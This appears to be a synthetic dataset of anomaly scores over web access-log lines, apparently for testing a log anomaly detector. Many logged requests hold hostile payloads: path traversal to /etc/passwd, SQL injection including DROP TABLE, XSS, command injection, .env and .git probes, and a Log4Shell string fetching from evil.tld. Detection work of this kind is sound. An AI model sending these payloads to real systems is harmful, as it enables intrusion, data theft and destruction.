score_content,score_session,score_fused,score_fused_norm,line
24.76226234436035,,24.76226234436035,24.76226234436035,153.74.48.47 - - [10/Jan/2025:12:05:53 +0100] "GET /search?q=ssd HTTP/1.1" 200 5325 "https://twitter.com/" "nikto/2.5.0"
13.40481185913086,,13.40481185913086,13.40481185913086,2.145.8.216 - - [10/Jan/2025:12:05:53 +0100] "PUT /profile HTTP/1.1" 200 18945 "https://news.ycombinator.com/" "curl/7.85.0"
30194.373046875,,30194.373046875,30194.373046875,52.28.191.116 - - [10/Jan/2025:12:05:53 +0100] "OPTIONS /api/products HTTP/1.1" 401 1 "https://news.ycombinator.com/" "curl/7.85.0"
0.2443525195121765,,0.2443525195121765,0.2443525195121765,84.143.101.90 - - [10/Jan/2025:12:05:56 +0100] "GET /assets/app.js HTTP/1.1" 200 17504 "https://news.ycombinator.com/" "nikto/2.5.0"
70.52742767333984,,70.52742767333984,70.52742767333984,93.202.172.230 - - [10/Jan/2025:12:05:56 +0100] "HEAD /search?q=laptop HTTP/1.1" 201 13311 "https://news.ycombinator.com/" "nikto/2.5.0"
96.17235565185547,,96.17235565185547,96.17235565185547,220.91.44.121 - - [10/Jan/2025:12:05:58 +0100] "OPTIONS /search?q=headphones HTTP/1.1" 201 8060 "https://example.com/" "sqlmap/1.7.2#stable"
48.68788146972656,,48.68788146972656,48.68788146972656,108.47.231.209 - - [10/Jan/2025:12:05:59 +0100] "HEAD /..%2f..%2fetc%2fpasswd HTTP/1.1" 302 11398 "https://news.ycombinator.com/" "nikto/2.5.0"
73.45321655273438,,73.45321655273438,73.45321655273438,112.205.51.250 - - [10/Jan/2025:12:06:02 +0100] "OPTIONS /logout HTTP/1.1" 200 11696 "https://twitter.com/" "nikto/2.5.0"
71.62361145019531,,71.62361145019531,71.62361145019531,11.110.13.212 - - [10/Jan/2025:12:06:02 +0100] "OPTIONS /..%2f..%2fetc%2fpasswd HTTP/1.1" 200 14409 "https://www.google.com/" "nikto/2.5.0"
96.12065887451172,,96.12065887451172,96.12065887451172,194.136.91.148 - - [10/Jan/2025:12:06:03 +0100] "OPTIONS /search?q=%27+OR+1%3D1+-- HTTP/1.1" 201 5277 "https://twitter.com/" "nikto/2.5.0"
27.6229305267334,,27.6229305267334,27.6229305267334,55.49.152.227 - - [10/Jan/2025:12:06:03 +0100] "DELETE /api/products HTTP/1.1" 204 3267 "-" "dirb/2.22"
2.949805974960327,,2.949805974960327,2.949805974960327,165.211.121.34 - - [10/Jan/2025:12:06:04 +0100] "POST /..%2f..%2fetc%2fpasswd HTTP/1.1" 200 2749 "https://www.google.com/" "sqlmap/1.7.2#stable"
5.869870185852051,,5.869870185852051,5.869870185852051,254.229.55.234 - - [10/Jan/2025:12:06:05 +0100] "POST /cgi-bin/test.cgi HTTP/1.1" 304 810 "https://news.ycombinator.com/" "python-requests/2.31.0"
30172.091796875,,30172.091796875,30172.091796875,91.89.179.36 - - [10/Jan/2025:12:06:07 +0100] "DELETE /api/product?id=123 HTTP/1.1" 403 1015 "https://news.ycombinator.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
30.435283660888672,,30.435283660888672,30.435283660888672,250.98.107.170 - - [10/Jan/2025:12:06:10 +0100] "DELETE /dashboard HTTP/1.1" 302 17701 "https://example.com/" "python-requests/2.31.0"
50.5855712890625,,50.5855712890625,50.5855712890625,250.225.214.231 - - [10/Jan/2025:12:06:11 +0100] "HEAD /about HTTP/1.1" 304 7503 "https://twitter.com/" "dirb/2.22"
27.7281436920166,,27.7281436920166,27.7281436920166,197.63.229.253 - - [10/Jan/2025:12:06:13 +0100] "DELETE /admin HTTP/1.1" 200 1418 "-" "curl/7.85.0"
27.879209518432617,,27.879209518432617,27.879209518432617,127.88.32.178 - - [10/Jan/2025:12:06:16 +0100] "POST /search?q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E HTTP/1.1" 200 9561 "https://example.com/" "curl/7.85.0"
53.283023834228516,,53.283023834228516,53.283023834228516,69.174.98.70 - - [10/Jan/2025:12:06:17 +0100] "DELETE /search?q=laptop HTTP/1.1" 301 8633 "https://example.com/" "python-requests/2.31.0"
25.927461624145508,,25.927461624145508,25.927461624145508,66.35.84.96 - - [10/Jan/2025:12:06:18 +0100] "DELETE /cgi-bin/test.cgi HTTP/1.1" 200 3650 "https://news.ycombinator.com/" "dirb/2.22"
24.670482635498047,,24.670482635498047,24.670482635498047,196.245.226.101 - - [10/Jan/2025:12:06:19 +0100] "GET /search?q=monitor HTTP/1.1" 200 1925 "https://twitter.com/" "curl/7.85.0"
4.861908435821533,,4.861908435821533,4.861908435821533,138.132.26.43 - - [10/Jan/2025:12:06:20 +0100] "POST /about HTTP/1.1" 200 13330 "https://news.ycombinator.com/" "Wget/1.21.2 (linux-gnu)"
1.987511157989502,,1.987511157989502,1.987511157989502,253.189.52.33 - - [10/Jan/2025:12:06:22 +0100] "GET /about HTTP/1.1" 200 18626 "https://example.com/" "sqlmap/1.7.2#stable"
96.29275512695312,,96.29275512695312,96.29275512695312,251.21.198.168 - - [10/Jan/2025:12:06:24 +0100] "OPTIONS /search?q=ssd HTTP/1.1" 200 5471 "-" "python-requests/2.31.0"
0.2212541699409485,,0.2212541699409485,0.2212541699409485,154.62.108.30 - - [10/Jan/2025:12:06:24 +0100] "GET /wp-login.php HTTP/1.1" 201 3676 "https://www.google.com/" "nikto/2.5.0"
0.29952681064605713,,0.29952681064605713,0.29952681064605713,14.223.69.199 - - [10/Jan/2025:12:06:24 +0100] "GET /index.html HTTP/1.1" 204 12301 "https://news.ycombinator.com/" "nikto/2.5.0"
30122.126953125,,30122.126953125,30122.126953125,192.17.31.84 - - [10/Jan/2025:12:06:27 +0100] "GET /assets/app.css HTTP/1.1" 404 267 "https://www.google.com/" "nikto/2.5.0"
104.70596313476562,,104.70596313476562,104.70596313476562,82.240.94.191 - - [10/Jan/2025:12:06:27 +0100] "TRACE /server-status HTTP/1.1" 200 19277 "https://www.google.com/" "nikto/2.5.0"
96.3275375366211,,96.3275375366211,96.3275375366211,190.246.140.253 - - [10/Jan/2025:12:06:30 +0100] "OPTIONS /api/product?id=123 HTTP/1.1" 200 16790 "https://twitter.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
30172.1328125,,30172.1328125,30172.1328125,251.28.133.157 - - [10/Jan/2025:12:06:33 +0100] "DELETE /search?q=camera HTTP/1.1" 404 852 "https://www.google.com/" "curl/7.85.0"
24.738996505737305,,24.738996505737305,24.738996505737305,30.118.145.143 - - [10/Jan/2025:12:06:33 +0100] "GET /search?q=phone HTTP/1.1" 200 11594 "-" "python-requests/2.31.0"
3.410568952560425,,3.410568952560425,3.410568952560425,110.90.19.32 - - [10/Jan/2025:12:06:33 +0100] "POST /.env HTTP/1.1" 200 18978 "https://news.ycombinator.com/" "python-requests/2.31.0"
50.566688537597656,,50.566688537597656,50.566688537597656,138.41.28.179 - - [10/Jan/2025:12:06:36 +0100] "DELETE /api/product?id=123 HTTP/1.1" 200 10464 "https://twitter.com/" "python-requests/2.31.0"
1.8123832941055298,,1.8123832941055298,1.8123832941055298,177.150.107.75 - - [10/Jan/2025:12:06:37 +0100] "GET /dashboard HTTP/1.1" 200 4955 "https://twitter.com/" "python-requests/2.31.0"
130.39993286132812,,130.39993286132812,130.39993286132812,72.153.98.59 - - [10/Jan/2025:12:06:38 +0100] "TRACE /search?q=%27+OR+1%3D1+-- HTTP/1.1" 302 17302 "https://twitter.com/" "dirb/2.22"
46.06732940673828,,46.06732940673828,46.06732940673828,252.219.169.34 - - [10/Jan/2025:12:06:41 +0100] "HEAD /.git/config HTTP/1.1" 200 8854 "https://twitter.com/" "dirb/2.22"
0.20088626444339752,,0.20088626444339752,0.20088626444339752,208.131.109.50 - - [10/Jan/2025:12:06:43 +0100] "GET /assets/app.js HTTP/1.1" 200 4165 "https://example.com/" "nikto/2.5.0"
50.47829818725586,,50.47829818725586,50.47829818725586,4.44.253.196 - - [10/Jan/2025:12:06:44 +0100] "DELETE /search?q=laptop HTTP/1.1" 200 3073 "https://www.google.com/" "Wget/1.21.2 (linux-gnu)"
30149.255859375,,30149.255859375,30149.255859375,176.212.3.221 - - [10/Jan/2025:12:06:46 +0100] "DELETE /about HTTP/1.1" 403 1480 "https://twitter.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
99.04743194580078,,99.04743194580078,99.04743194580078,210.153.72.135 - - [10/Jan/2025:12:06:47 +0100] "OPTIONS /search?q=router HTTP/1.1" 302 8929 "-" "curl/7.85.0"
103.42803192138672,,103.42803192138672,103.42803192138672,44.5.234.220 - - [10/Jan/2025:12:06:49 +0100] "TRACE /.env HTTP/1.1" 200 4422 "https://news.ycombinator.com/" "sqlmap/1.7.2#stable"
36.19447326660156,,36.19447326660156,36.19447326660156,247.176.117.195 - - [10/Jan/2025:12:06:52 +0100] "PUT /search?q=laptop HTTP/1.1" 200 9260 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
71.68123626708984,,71.68123626708984,71.68123626708984,240.103.94.143 - - [10/Jan/2025:12:06:52 +0100] "OPTIONS /../../etc/passwd HTTP/1.1" 200 8976 "https://www.google.com/" "sqlmap/1.7.2#stable"
127.62592315673828,,127.62592315673828,127.62592315673828,227.168.233.244 - - [10/Jan/2025:12:06:53 +0100] "TRACE /search?q=headphones HTTP/1.1" 200 14438 "https://twitter.com/" "sqlmap/1.7.2#stable"
4.7970452308654785,,4.7970452308654785,4.7970452308654785,120.62.45.66 - - [10/Jan/2025:12:06:56 +0100] "POST /contact HTTP/1.1" 204 16713 "https://news.ycombinator.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
50.51020812988281,,50.51020812988281,50.51020812988281,86.62.105.93 - - [10/Jan/2025:12:06:57 +0100] "HEAD /profile HTTP/1.1" 302 18342 "-" "curl/7.85.0"
36.1307258605957,,36.1307258605957,36.1307258605957,124.227.239.222 - - [10/Jan/2025:12:06:57 +0100] "PUT /search?q=headphones HTTP/1.1" 200 9190 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
0.2408440113067627,,0.2408440113067627,0.2408440113067627,243.147.3.217 - - [10/Jan/2025:12:06:57 +0100] "GET /assets/app.js HTTP/1.1" 200 16220 "https://example.com/" "Wget/1.21.2 (linux-gnu)"
24.753150939941406,,24.753150939941406,24.753150939941406,198.180.146.73 - - [10/Jan/2025:12:06:58 +0100] "GET /api/product?id=123 HTTP/1.1" 200 3149 "https://example.com/" "dirb/2.22"
0.06731981784105301,,0.06731981784105301,0.06731981784105301,244.177.203.90 - - [10/Jan/2025:12:07:01 +0100] "GET /..%2f..%2fetc%2fpasswd HTTP/1.1" 200 5070 "-" "nikto/2.5.0"
24.726377487182617,,24.726377487182617,24.726377487182617,158.1.34.204 - - [10/Jan/2025:12:07:03 +0100] "GET /api/run?cmd=cat+%2Fetc%2Fpasswd HTTP/1.1" 200 8045 "https://example.com/" "dirb/2.22"
36.2443733215332,,36.2443733215332,36.2443733215332,105.5.159.20 - - [10/Jan/2025:12:07:05 +0100] "PUT /api/product?id=123 HTTP/1.1" 200 5676 "https://www.google.com/" "curl/7.85.0"
127.71453094482422,,127.71453094482422,127.71453094482422,126.241.225.53 - - [10/Jan/2025:12:07:07 +0100] "TRACE /search?q=ssd HTTP/1.1" 200 2301 "https://example.com/" "dirb/2.22"
24.745752334594727,,24.745752334594727,24.745752334594727,3.222.60.230 - - [10/Jan/2025:12:07:10 +0100] "GET /search?q=phone HTTP/1.1" 200 13759 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
11057.193359375,,11057.193359375,11057.193359375,195.14.104.47 - - [10/Jan/2025:12:07:12 +0100] "PUT /search?q=headphones HTTP/1.1" 500 423 "https://example.com/" "nikto/2.5.0"
3.032698631286621,,3.032698631286621,3.032698631286621,46.34.55.60 - - [10/Jan/2025:12:07:13 +0100] "GET /assets/app.js HTTP/1.1" 302 16598 "-" "Wget/1.21.2 (linux-gnu)"
0.24634742736816406,,0.24634742736816406,0.24634742736816406,19.142.42.112 - - [10/Jan/2025:12:07:15 +0100] "GET /assets/app.js HTTP/1.1" 200 18256 "https://news.ycombinator.com/" "dirb/2.22"
27.695777893066406,,27.695777893066406,27.695777893066406,141.179.206.15 - - [10/Jan/2025:12:07:18 +0100] "DELETE /profile HTTP/1.1" 200 14517 "https://example.com/" "python-requests/2.31.0"
47.534400939941406,,47.534400939941406,47.534400939941406,195.113.29.205 - - [10/Jan/2025:12:07:19 +0100] "HEAD /server-status HTTP/1.1" 200 12503 "https://news.ycombinator.com/" "dirb/2.22"
73.43045043945312,,73.43045043945312,73.43045043945312,73.116.82.22 - - [10/Jan/2025:12:07:20 +0100] "OPTIONS /logout HTTP/1.1" 200 5235 "https://news.ycombinator.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
27.725496292114258,,27.725496292114258,27.725496292114258,60.179.45.179 - - [10/Jan/2025:12:07:21 +0100] "DELETE /login HTTP/1.1" 200 2130 "https://www.google.com/" "sqlmap/1.7.2#stable"
11021.263671875,,11021.263671875,11021.263671875,44.135.147.78 - - [10/Jan/2025:12:07:22 +0100] "GET /index.html HTTP/1.1" 500 757 "https://news.ycombinator.com/" "curl/7.85.0"
127.74386596679688,,127.74386596679688,127.74386596679688,14.109.178.22 - - [10/Jan/2025:12:07:22 +0100] "TRACE /api/product?id=123 HTTP/1.1" 200 11900 "https://news.ycombinator.com/" "sqlmap/1.7.2#stable"
27.775798797607422,,27.775798797607422,27.775798797607422,209.226.222.52 - - [10/Jan/2025:12:07:22 +0100] "DELETE /about HTTP/1.1" 200 18481 "https://news.ycombinator.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
27.591758728027344,,27.591758728027344,27.591758728027344,34.97.36.122 - - [10/Jan/2025:12:07:24 +0100] "POST /search?q=monitor HTTP/1.1" 200 12931 "https://twitter.com/" "dirb/2.22"
24.73628044128418,,24.73628044128418,24.73628044128418,232.173.163.171 - - [10/Jan/2025:12:07:27 +0100] "GET /search?q=laptop HTTP/1.1" 200 17524 "https://twitter.com/" "python-requests/2.31.0"
0.31704312562942505,,0.31704312562942505,0.31704312562942505,212.17.234.98 - - [10/Jan/2025:12:07:29 +0100] "GET /index.html HTTP/1.1" 200 16344 "https://example.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
70.80840301513672,,70.80840301513672,70.80840301513672,184.214.91.224 - - [10/Jan/2025:12:07:31 +0100] "HEAD /search?q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E HTTP/1.1" 200 12452 "https://www.google.com/" "dirb/2.22"
4.758222579956055,,4.758222579956055,4.758222579956055,168.92.17.97 - - [10/Jan/2025:12:07:32 +0100] "POST /profile HTTP/1.1" 200 3090 "https://news.ycombinator.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
0.22215160727500916,,0.22215160727500916,0.22215160727500916,184.43.143.172 - - [10/Jan/2025:12:07:32 +0100] "GET /assets/app.css HTTP/1.1" 200 17399 "https://example.com/" "Wget/1.21.2 (linux-gnu)"
3.3780784606933594,,3.3780784606933594,3.3780784606933594,216.229.1.85 - - [10/Jan/2025:12:07:34 +0100] "POST /.env HTTP/1.1" 200 8299 "-" "nikto/2.5.0"
0.21789169311523438,,0.21789169311523438,0.21789169311523438,64.68.108.163 - - [10/Jan/2025:12:07:34 +0100] "GET /assets/app.css HTTP/1.1" 200 15851 "https://www.google.com/" "curl/7.85.0"
3.1743719577789307,,3.1743719577789307,3.1743719577789307,213.19.100.28 - - [10/Jan/2025:12:07:37 +0100] "POST /.git/config HTTP/1.1" 200 14572 "https://twitter.com/" "curl/7.85.0"
30.4202823638916,,30.4202823638916,30.4202823638916,254.27.190.150 - - [10/Jan/2025:12:07:37 +0100] "DELETE /dashboard HTTP/1.1" 301 19606 "https://www.google.com/" "Wget/1.21.2 (linux-gnu)"
50.4401741027832,,50.4401741027832,50.4401741027832,21.102.246.231 - - [10/Jan/2025:12:07:40 +0100] "DELETE /search?q=headphones HTTP/1.1" 200 10336 "https://example.com/" "sqlmap/1.7.2#stable"
30173.142578125,,30173.142578125,30173.142578125,125.232.214.36 - - [10/Jan/2025:12:07:40 +0100] "DELETE /search?q=headphones HTTP/1.1" 429 1305 "https://www.google.com/" "sqlmap/1.7.2#stable"
4.734747409820557,,4.734747409820557,4.734747409820557,223.62.216.243 - - [10/Jan/2025:12:07:40 +0100] "POST /api/products HTTP/1.1" 200 5101 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
1.973569393157959,,1.973569393157959,1.973569393157959,17.18.172.80 - - [10/Jan/2025:12:07:40 +0100] "GET /login HTTP/1.1" 200 13644 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
30146.8125,,30146.8125,30146.8125,235.191.155.53 - - [10/Jan/2025:12:07:42 +0100] "GET /search?q=headphones HTTP/1.1" 404 304 "-" "curl/7.85.0"
13.384780883789062,,13.384780883789062,13.384780883789062,144.234.101.1 - - [10/Jan/2025:12:07:43 +0100] "PUT /contact HTTP/1.1" 200 11957 "https://twitter.com/" "sqlmap/1.7.2#stable"
0.0651455819606781,,0.0651455819606781,0.0651455819606781,26.117.43.197 - - [10/Jan/2025:12:07:46 +0100] "GET /..%2f..%2fetc%2fpasswd HTTP/1.1" 200 4450 "https://www.google.com/" "python-requests/2.31.0"
4.793363094329834,,4.793363094329834,4.793363094329834,60.10.206.94 - - [10/Jan/2025:12:07:48 +0100] "POST /logout HTTP/1.1" 200 1464 "https://example.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
36.20878601074219,,36.20878601074219,36.20878601074219,146.130.145.208 - - [10/Jan/2025:12:07:50 +0100] "PUT /search?q=camera HTTP/1.1" 200 13673 "https://example.com/" "sqlmap/1.7.2#stable"
30172.130859375,,30172.130859375,30172.130859375,217.120.231.136 - - [10/Jan/2025:12:07:52 +0100] "DELETE /search?q=camera HTTP/1.1" 404 1298 "https://news.ycombinator.com/" "dirb/2.22"
30168.9140625,,30168.9140625,30168.9140625,146.20.9.87 - - [10/Jan/2025:12:07:54 +0100] "HEAD /login HTTP/1.1" 403 100 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
39.03763198852539,,39.03763198852539,39.03763198852539,198.119.145.110 - - [10/Jan/2025:12:07:56 +0100] "PUT /api/product?id=123 HTTP/1.1" 302 4046 "https://www.google.com/" "Wget/1.21.2 (linux-gnu)"
39.036190032958984,,39.036190032958984,39.036190032958984,97.39.139.241 - - [10/Jan/2025:12:07:56 +0100] "PUT /api/user?id=1;DROP TABLE users HTTP/1.1" 302 3569 "https://example.com/" "dirb/2.22"
104.82101440429688,,104.82101440429688,104.82101440429688,184.246.225.176 - - [10/Jan/2025:12:07:59 +0100] "TRACE /profile HTTP/1.1" 200 3327 "https://example.com/" "dirb/2.22"
24.73120880126953,,24.73120880126953,24.73120880126953,163.155.240.86 - - [10/Jan/2025:12:08:00 +0100] "GET /search?q=laptop HTTP/1.1" 200 15687 "https://www.google.com/" "curl/7.85.0"
1.7923762798309326,,1.7923762798309326,1.7923762798309326,133.178.125.94 - - [10/Jan/2025:12:08:03 +0100] "GET /phpmyadmin HTTP/1.1" 204 8869 "https://www.google.com/" "sqlmap/1.7.2#stable"
96.44647979736328,,96.44647979736328,96.44647979736328,85.213.208.15 - - [10/Jan/2025:12:08:03 +0100] "OPTIONS /?id=%24%7Bjndi%3Aldap%3A%2F%2Fevil.tld%2Fa%7D HTTP/1.1" 200 17015 "-" "sqlmap/1.7.2#stable"
99.04243469238281,,99.04243469238281,99.04243469238281,16.242.221.193 - - [10/Jan/2025:12:08:04 +0100] "OPTIONS /search?q=laptop HTTP/1.1" 301 13482 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
27.394010543823242,,27.394010543823242,27.394010543823242,221.106.175.44 - - [10/Jan/2025:12:08:04 +0100] "GET /search?q=%27+OR+1%3D1+-- HTTP/1.1" 301 14812 "https://news.ycombinator.com/" "dirb/2.22"
27.695085525512695,,27.695085525512695,27.695085525512695,188.95.82.106 - - [10/Jan/2025:12:08:04 +0100] "DELETE /contact HTTP/1.1" 204 16236 "https://news.ycombinator.com/" "nikto/2.5.0"
0.21620096266269684,,0.21620096266269684,0.21620096266269684,230.130.197.218 - - [10/Jan/2025:12:08:05 +0100] "GET /assets/app.css HTTP/1.1" 200 15256 "https://news.ycombinator.com/" "nikto/2.5.0"
30.52057647705078,,30.52057647705078,30.52057647705078,182.228.158.70 - - [10/Jan/2025:12:08:08 +0100] "DELETE /contact HTTP/1.1" 304 11749 "https://www.google.com/" "curl/7.85.0"
1.917396068572998,,1.917396068572998,1.917396068572998,149.224.246.61 - - [10/Jan/2025:12:08:08 +0100] "GET /contact HTTP/1.1" 200 293 "https://example.com/" "nikto/2.5.0"
46.31578063964844,,46.31578063964844,46.31578063964844,94.143.137.89 - - [10/Jan/2025:12:08:10 +0100] "HEAD /.env HTTP/1.1" 204 18961 "-" "dirb/2.22"
99.0669174194336,,99.0669174194336,99.0669174194336,77.75.44.144 - - [10/Jan/2025:12:08:10 +0100] "OPTIONS /search?q=monitor HTTP/1.1" 304 8144 "-" "Wget/1.21.2 (linux-gnu)"
1.945927381515503,,1.945927381515503,1.945927381515503,240.218.25.128 - - [10/Jan/2025:12:08:12 +0100] "GET /logout HTTP/1.1" 200 16313 "https://news.ycombinator.com/" "curl/7.85.0"
2.9748787879943848,,2.9748787879943848,2.9748787879943848,36.102.175.159 - - [10/Jan/2025:12:08:12 +0100] "GET /assets/app.css HTTP/1.1" 301 11274 "https://www.google.com/" "dirb/2.22"
13.428740501403809,,13.428740501403809,13.428740501403809,193.88.154.82 - - [10/Jan/2025:12:08:12 +0100] "PUT /about HTTP/1.1" 201 5306 "https://news.ycombinator.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
53.304222106933594,,53.304222106933594,53.304222106933594,74.56.170.243 - - [10/Jan/2025:12:08:12 +0100] "DELETE /search?q=router HTTP/1.1" 302 8972 "https://news.ycombinator.com/" "dirb/2.22"
16.18198013305664,,16.18198013305664,16.18198013305664,205.238.34.33 - - [10/Jan/2025:12:08:14 +0100] "PUT /logout HTTP/1.1" 301 9605 "https://example.com/" "python-requests/2.31.0"
2.1623260974884033,,2.1623260974884033,2.1623260974884033,152.48.25.184 - - [10/Jan/2025:12:08:17 +0100] "GET / HTTP/1.1" 204 11180 "https://twitter.com/" "dirb/2.22"
39.09429931640625,,39.09429931640625,39.09429931640625,131.175.60.114 - - [10/Jan/2025:12:08:18 +0100] "PUT /api/product?id=123 HTTP/1.1" 304 8504 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
130.55125427246094,,130.55125427246094,130.55125427246094,24.121.37.156 - - [10/Jan/2025:12:08:18 +0100] "TRACE /api/product?id=123 HTTP/1.1" 301 18891 "https://news.ycombinator.com/" "Wget/1.21.2 (linux-gnu)"
0.10644450038671494,,0.10644450038671494,0.10644450038671494,121.116.95.241 - - [10/Jan/2025:12:08:21 +0100] "GET /..%2f..%2fetc%2fpasswd HTTP/1.1" 200 17051 "https://news.ycombinator.com/" "sqlmap/1.7.2#stable"
0.32343733310699463,,0.32343733310699463,0.32343733310699463,10.87.150.237 - - [10/Jan/2025:12:08:22 +0100] "GET /index.html HTTP/1.1" 200 18730 "https://www.google.com/" "dirb/2.22"
30168.892578125,,30168.892578125,30168.892578125,88.76.35.102 - - [10/Jan/2025:12:08:24 +0100] "HEAD /admin HTTP/1.1" 400 24 "https://www.google.com/" "dirb/2.22"
47.6679801940918,,47.6679801940918,47.6679801940918,86.180.251.188 - - [10/Jan/2025:12:08:24 +0100] "HEAD /api/products HTTP/1.1" 200 11431 "https://example.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
24.654987335205078,,24.654987335205078,24.654987335205078,62.84.9.253 - - [10/Jan/2025:12:08:24 +0100] "GET /search?q=headphones HTTP/1.1" 200 11605 "https://twitter.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
13.446419715881348,,13.446419715881348,13.446419715881348,213.145.55.33 - - [10/Jan/2025:12:08:27 +0100] "PUT /about HTTP/1.1" 200 546 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
0.2815328538417816,,0.2815328538417816,0.2815328538417816,75.77.52.175 - - [10/Jan/2025:12:08:27 +0100] "GET /index.html HTTP/1.1" 200 5530 "https://www.google.com/" "sqlmap/1.7.2#stable"
30123.919921875,,30123.919921875,30123.919921875,80.184.3.204 - - [10/Jan/2025:12:08:30 +0100] "GET / HTTP/1.1" 403 1227 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
96.23412322998047,,96.23412322998047,96.23412322998047,229.29.14.142 - - [10/Jan/2025:12:08:30 +0100] "OPTIONS /search?q=camera HTTP/1.1" 200 7193 "https://twitter.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
4.727487564086914,,4.727487564086914,4.727487564086914,119.120.172.57 - - [10/Jan/2025:12:08:33 +0100] "POST /api/products HTTP/1.1" 200 2296 "-" "sqlmap/1.7.2#stable"
3.135558843612671,,3.135558843612671,3.135558843612671,87.232.4.195 - - [10/Jan/2025:12:08:36 +0100] "POST /.git/config HTTP/1.1" 200 2860 "https://twitter.com/" "nikto/2.5.0"
2.996671438217163,,2.996671438217163,2.996671438217163,227.43.167.139 - - [10/Jan/2025:12:08:39 +0100] "GET /assets/app.css HTTP/1.1" 302 11841 "https://example.com/" "curl/7.85.0"
96.20917510986328,,96.20917510986328,96.20917510986328,174.99.79.23 - - [10/Jan/2025:12:08:42 +0100] "OPTIONS /search?q=headphones HTTP/1.1" 200 19502 "https://example.com/" "dirb/2.22"
16.195096969604492,,16.195096969604492,16.195096969604492,19.135.120.132 - - [10/Jan/2025:12:08:43 +0100] "PUT /logout HTTP/1.1" 301 13673 "https://www.google.com/" "curl/7.85.0"
30158.076171875,,30158.076171875,30158.076171875,205.190.106.32 - - [10/Jan/2025:12:08:43 +0100] "PUT /search?q=camera HTTP/1.1" 401 853 "https://example.com/" "sqlmap/1.7.2#stable"
